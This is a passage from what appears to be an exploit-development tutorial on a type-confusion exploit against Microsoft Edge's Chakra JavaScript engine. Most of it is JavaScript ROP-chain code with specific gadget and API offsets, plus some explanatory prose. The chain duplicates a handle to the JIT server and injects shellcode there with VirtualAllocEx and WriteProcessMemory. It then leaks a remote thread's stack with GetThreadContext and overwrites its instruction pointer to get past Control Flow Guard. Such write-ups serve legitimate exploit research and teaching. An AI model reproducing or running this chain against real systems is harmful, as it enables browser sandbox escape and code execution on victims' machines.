write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// VirtualAlloc() ROP chain
// Stage 7 -> Allocate some local memory to store the CONTEXT structure from GetThreadContext

// DWORD flProtect (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // PAGE_READWRITE (0x4)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// LPVOID lpAddress (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (let VirtualAlloc() decide the address)
next();

// SIZE_T dwSize (RDX) (0x4d0 = sizeof(CONTEXT))
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x000004d0, 0x00000000);             // (0x4d0 bytes)
next();

// DWORD flAllocationType (R8) ( MEM_RESERVE | MEM_COMMIT = 0x3000)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT (0x3000)
next();

// Call KERNELBASE!VirtualAlloc
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x5ac10, kernelbaseHigh); // KERNELBASE!VirtualAlloc address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAlloc)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAlloc - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();

// GetThreadContext() ROP chain
// Stage 8 -> Dump the registers of our newly created thread within the JIT process to leak the stack

// First, let's store some needed offsets of our VirtualAlloc allocation, as well as the address itself, in the .data section of kernelbase.dll
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108, kernelbaseHigh); // .data section of kernelbase.dll where we will store the VirtualAlloc allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// Save VirtualAlloc_allocation+0x30. This is the offset in our buffer (CONTEXT structure) that is ContextFlags
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we will store CONTEXT.ContextFlags
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// We need to set CONTEXT.ContextFlags. This address (0x30 offset from CONTEXT buffer allocated from VirtualAlloc) is in kernelbase+0x21a110
// The value we need to set is 0x10001F
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll with CONTEXT.ContextFlags address
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x0010001F, 0x00000000);             // CONTEXT_ALL
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// HANDLE hThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future mov qword [rax+0x20], rcx gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
next();

// LPCONTEXT lpContext
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
next();                                                                      
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// Call KERNELBASE!GetThreadContext
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x72d10, kernelbaseHigh); // KERNELBASE!GetThreadContext address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!GetThreadContext)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!GetThreadContext - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();

// Locate store CONTEXT.Rsp and store it in .data of kernelbase.dll
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we stored CONTEXT.ContextFlags
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4c37c5, chakraHigh);		// 0x1804c37c5: mov rax, qword [rcx] ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x26f73a, chakraHigh);       // 0x18026f73a: add rax, 0x68 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a118, kernelbaseHigh); // .data section of kernelbase.dll where we want to store CONTEXT.Rsp
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// Update CONTEXT.Rip to point to a ret gadget directly instead of relying on CreateRemoteThread start routine (which CFG checks)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x26f72a, chakraHigh);      // 0x18026f72a: add rax, 0x60 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // ret gadget we want to overwrite our remote thread's RIP with 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfeab, chakraHigh);        // 0x18000feab: mov qword [rax], rcx ; ret  (Context.Rip = ret_gadget)
next();
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion171.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion172.png" alt="">

After preserving `CONTEXT.Rsp`, we can manipulate `CONTEXT.Rip` to _directly_ point to our `ret` gadget. We don't really need to save this address, because once we are done writing to it, we simply don't need to worry about it anymore.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion173.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion174.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion175.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion176.png" alt="">

Now that we have RSP preserved, it is finally time to use one last call to `WriteProcessMemory` to write our final `VirtualProtect` ROP chain into the JIT process.

`WriteProcessMemory` ROP Chain (Round 4)
---

Our last step is to write our ROP chain into the remote process. You may be thinking - "Connor, we just hijacked RIP. Why can't we just hijack RSP instead of writing our payload to the existing stack?" Great question! We know that if we call `SetThreadContext`, CFG doesn't perform any validation on the instruction pointer to ensure we aren't calling into the middle or end of a function. There is now way for CFG to know this! However, CFG _does_ perform some slight validation of the stack pointer on `SetThreadContext` calls - via a function called `RtlGuardIsValidStackPointer`.

When the `SetThreadContext` function is called, this performs a `syscall` to the kernel (via `NtSetContextThread`). In the kernel, this eventually leads to the kernel version of `NtSetContextThread`, which calls `PspSetContextThreadInternal`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion177.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion178.png" alt="">

`PspSetContextInternal` eventually calls `KeVerifyContextRecord`. `KeVerifyContext` record eventually calls a function called `RtlGuardIsValidStackPointer`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion179.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion180.png" alt="">

This feature of CFG checks the TEB to ensure that any call to `SetThreadContext` has a stack base and limit within the known bounds of the stack managed by the TEB. This is why we cannot change RSP to something like our `VirtualAllocEx` allocation - as it isn't within the known stack bounds. Because of this, we have to directly write our ROP payload to the existing stack (which we leaked via `GetThreadContext`).

With that said, let's see our last `WriteProcessMemory` call. Here is how the call will be setup:

```c
WriteProcessMemory(
	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	addressof(CONTEXT.Rsp),				// Address of our remote thread's stack
	addressof(data_chakra_shellcode_location),	// Address of our VirtualProtect ROP chain in the content process (.data of chakra) (what we want to write (our ROP chain))
	sizeof(rop_chain)				// Size of our ROP chain
	NULL 						// Optional
);
```

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();

// VirtuaAllocEx() ROP chain
// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

// DWORD flAllocationType (R9)
// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
/*
0:031> ? 0x00002000 | 0x00001000 
Evaluate expression: 12288 = 00000000`00003000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// SIZE_T dwSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPVOID lpAddress (RDX)
// Let VirtualAllocEx decide where the memory will be located
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it

// Call KERNELBASE!VirtualAllocEx
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain
// Stage 3 -> Write our shellcode into the JIT process

// Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

/*
0:015> dq kernelbase+0x216000+0x4000 L2
00007fff`58cfa000  00000000`00000000 00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
